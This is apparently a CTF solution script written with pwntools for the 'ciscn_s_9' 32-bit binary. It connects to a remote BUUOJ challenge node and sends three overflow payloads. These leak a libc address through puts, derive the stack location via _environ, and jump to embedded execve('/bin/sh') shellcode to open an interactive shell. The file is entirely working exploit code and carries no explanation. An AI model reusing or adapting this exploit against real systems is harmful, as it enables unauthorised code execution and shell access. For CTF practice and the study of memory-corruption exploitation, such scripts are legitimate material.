#+++++++++++++++++++exp.py++++++++++++++++++++
# -*- coding:utf-8 -*-                           
#Author: Squarer
#Time: Thu Jan 28 11:01:09 CST 2021
#+++++++++++++++++++exp.py++++++++++++++++++++
from pwn import*

context.log_level = 'debug'
context.arch = 'i386'

elf = ELF('./ciscn_s_9')
libc = ELF('./libc-2.27_32.so')
#libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
#libc=ELF('/lib/i386-linux-gnu/libc.so.6')

sh = process('./ciscn_s_9')
sh = remote('node3.buuoj.cn',28951)
shellcode = "\xeb\x07\x5b\x31\xc0\xb0\x0b\xcd\x80\xe8\xf4\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"
start = 0x080483C0
main = 0x08048559
payload1 = shellcode.ljust(0x20,'\x00') + p32(0xdeadbeef) + p32(elf.plt['puts']) + p32(start) + p32(0x0804A040)
sh.sendline(payload1)
sh.recvuntil('bye~\n')
stdin = u32(sh.recvuntil('\xf7'))
libc_addr = stdin - libc.sym['_IO_2_1_stdin_']
_environ = libc_addr + libc.sym['_environ']
log.success(hex(stdin))
log.success(hex(libc_addr))
log.success(hex(_environ))

payload2 = shellcode.ljust(0x20,'\x00') + p32(0xdeadbeef) + p32(elf.plt['puts']) + p32(start) + p32(_environ)
# gdb.attach(sh)
sh.sendline(payload2)
sh.recvuntil('bye~\n')
shellcode_addr = u32(sh.recv(4)) - 0x194 - 0xb0
log.success(hex(shellcode_addr))

payload3 = shellcode.ljust(0x20,'\x00') + p32(0xdeadbeef) + p32(shellcode_addr)
# gdb.attach(sh)
sh.sendline(payload3)


sh.interactive()
